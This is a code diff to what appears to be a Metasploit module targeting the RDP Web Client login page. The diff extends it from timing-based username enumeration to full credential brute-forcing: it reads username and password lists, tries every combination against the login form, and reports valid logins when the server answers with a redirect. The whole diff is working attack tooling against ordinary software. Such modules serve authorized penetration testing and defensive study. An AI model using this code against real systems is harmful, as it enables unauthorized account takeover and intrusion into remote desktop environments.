@@ -8,6 +8,7 @@ from metasploit import module
 DEPENDENCIES_MISSING = False
 try:
     import base64
+    import itertools
     import os
     import requests
 except ImportError:
@@ -31,12 +32,19 @@ metadata = {
     ],
     'type': 'single_scanner',
     'options': {
-        'targeturi': {'type': 'string', 'description': 'The base path to the RDP Web Client install',
+        'targeturi': {'type': 'string',
+                      'description': 'The base path to the RDP Web Client install',
                       'required': True, 'default': '/RDWeb/Pages/en-US/login.aspx'},
-        'rport': {'type': 'port', 'description': 'Port to target', 'required': True, 'default': 443},
-        'domain': {'type': 'string', 'description': 'The target AD domain', 'required': False, 'default': None},
-        'username': {'type': 'string', 'description': 'The username to verify or path to a file of usernames',
+        'rport': {'type': 'port', 'description': 'Port to target',
+                  'required': True, 'default': 443},
+        'domain': {'type': 'string', 'description': 'The target AD domain',
+                   'required': False, 'default': None},
+        'username': {'type': 'string',
+                     'description': 'The username to verify or path to a file of usernames',
                      'required': True, 'default': None},
+        'password': {'type': 'string',
+                     'description': 'The password to try or path to a file of passwords',
+                     'required': False, 'default': None},
         'timeout': {'type': 'int',
                     'description': 'Timeout in milliseconds for response to consider username invalid',
                     'required': True, 'default': 1250},
@@ -69,42 +77,45 @@ def get_ad_domain(rhost, rport):
     return None
 
 
-def check_username(rhost, rport, targeturi, domain, username, timeout):
-    """Check a single username against the RDWeb Client
+def check_login(rhost, rport, targeturi, domain, username, password, timeout):
+    """Check a single login against the RDWeb Client
     The timeout is used to specify the amount of milliseconds where a
     response should consider the username invalid."""
 
     url = f'https://{rhost}:{rport}/{targeturi}'
-    body = f'DomainUserName={domain}%5C{username}&UserPass=incorrect'
+    body = f'DomainUserName={domain}%5C{username}&UserPass={password}'
     headers = {'Host':rhost,
                'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0',
                'Content-Type': 'application/x-www-form-urlencoded',
-               'Content-Length': '53',
-               'Origin': 'https://{rhost}'}
+               'Content-Length': f'{len(body)}',
+               'Origin': f'https://{rhost}'}
     session = requests.Session()
-    report_data = {'domain':domain, 'address': rhost, 'port': rport, 'protocol': 'tcp', 'service_name':'RDWeb'} 
+    report_data = {'domain':domain, 'address': rhost, 'port': rport,
+                   'protocol': 'tcp', 'service_name':'RDWeb'}
     try:
         request = session.post(url, data=body, headers=headers,
-                               timeout=(timeout / 1000), verify=False)
-        if request.status_code == 200:
-            module.log(f'Username {domain}\\{username} is valid! Response received in {request.elapsed.microseconds / 1000} milliseconds',
+                               timeout=(timeout / 1000), verify=False, allow_redirects=False)
+        if request.status_code == 302:
+            module.log(f'Login {domain}\\{username}:{password} is valid!', level='good')
+            module.report_correct_password(username, password, **report_data)
+        elif request.status_code == 200:
+            module.log(f'Password {password} is invalid but {domain}\\{username} is valid! Response received in {request.elapsed.microseconds / 1000} milliseconds',
                        level='good')
             module.report_valid_username(username, **report_data)
+        else:
+            module.log(f'Received unknown response with status code: {request.status_code}')
     except requests.exceptions.Timeout:
-        module.log(f'Username {domain}\\{username} is invalid! No response received in {timeout} milliseconds',
+        module.log(f'Login {domain}\\{username}:{password} is invalid! No response received in {timeout} milliseconds',
                    level='error')
     except requests.exceptions.RequestException as exc:
         module.log('{}'.format(exc), level='error')
         return
 
 
-def check_usernames(rhost, rport, targeturi, domain, username_file, timeout):
-    """Check each username in the provided username file"""
-    with open(username_file, 'r') as file_contents:
-        usernames = file_contents.readlines()
-        for user in usernames:
-            check_username(rhost, rport, targeturi, domain, user.strip(), timeout)
-
+def check_logins(rhost, rport, targeturi, domain, usernames, passwords, timeout):
+    """Check each login combination"""
+    for (username, password) in list(itertools.product(usernames, passwords)):
+        check_login(rhost, rport, targeturi, domain, username.strip(), password.strip(), timeout)
 
 def run(args):
     """Run the module, gathering the domain if desired and verifying usernames"""
@@ -124,15 +135,21 @@ def run(args):
                    level='error')
         return
 
-
-    # Check the provided username or file of usernames
+    # Gather usernames and passwords for enumeration
     if os.path.isfile(args['username']):
-        check_usernames(args['RHOSTS'], args['rport'], args['targeturi'],
-                   domain, args['username'], int(args['timeout']))
+        with open(args['username'], 'r') as file_contents:
+            usernames = file_contents.readlines()
     else:
-        check_username(args['RHOSTS'], args['rport'], args['targeturi'],
-                       domain, args['username'], int(args['timeout']))
+        usernames = [args['username']]
+    if os.path.isfile(args['password']):
+        with open(args['password'], 'r') as file_contents:
+            passwords = file_contents.readlines()
+    else:
+        passwords = [args['password']]
 
+    # Check each valid login combination
+    check_logins(args['RHOSTS'], args['rport'], args['targeturi'],
+                   domain, usernames, passwords, int(args['timeout']))
 
 if __name__ == '__main__':
     module.run(metadata, run)
